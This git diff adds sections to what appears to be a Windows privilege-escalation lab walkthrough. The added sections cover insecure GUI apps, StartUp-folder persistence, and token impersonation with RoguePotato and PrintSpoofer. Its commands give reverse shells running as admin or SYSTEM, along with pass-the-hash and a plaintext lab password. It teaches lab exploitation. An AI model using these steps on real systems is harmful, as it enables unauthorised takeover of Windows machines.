@@ -236,6 +236,7 @@ pth-winexe -U 'admin%hash' //10.10.126.68 cmd.exe
 ```
 
 ## **Scheduled Tasks**
+
 View the contents of the C:\DevTools\CleanUp.ps1 script:
 ```
 type C:\DevTools\CleanUp.ps1
@@ -250,16 +251,73 @@ echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
 ```
 Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
 
-## Title
+## **Insecure GUI Apps**
 
-### Place 1
+Start an RDP session as the "user" account:
+```
+rdesktop -u user -p password321 MACHINE_IP
+```
+Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
+```
+tasklist /V | findstr mspaint.exe
+```
+In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
 
-Hello, this is some text to fill in this, [here](#place-2), is a link to the second place.
+Press Enter to spawn a command prompt running with admin privileges.
 
-### Place 2
+## **Startup Apps**
 
-Place one has the fun times of linking here, but I can also link back [here](#place-1).
+Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
+```
+C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
+```
+cscript C:\PrivEsc\CreateShortcut.vbs
+```
+Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
+```
+rdesktop -u admin MACHINE_IP
+```
+A shell running as admin should connect back to your listener.
 
-### Place's 3: other example
+## **Token Impersonation**
 
-Place one has the fun times of linking here, but I can also link back [here](#places-3-other-example).
+### **Rogue Potato**
+
+Set up a socat redirector on Kali, forwarding Kali port 135 to port 9999 on Windows:
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999
+```
+Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
+```
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+Start another listener on Kali.
+
+Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
+```
+C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
+```
+
+### **PrintSpoofer**
+
+Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:
+```
+C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
+```
+Start another listener on Kali.
+
+Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
+```
+C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
+```
+
+## **Privilege Escalation Scripts**
+
+Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:
+
+* winPEASany.exe
+* Seatbelt.exe
+* PowerUp.ps1
+* SharpUp.exe
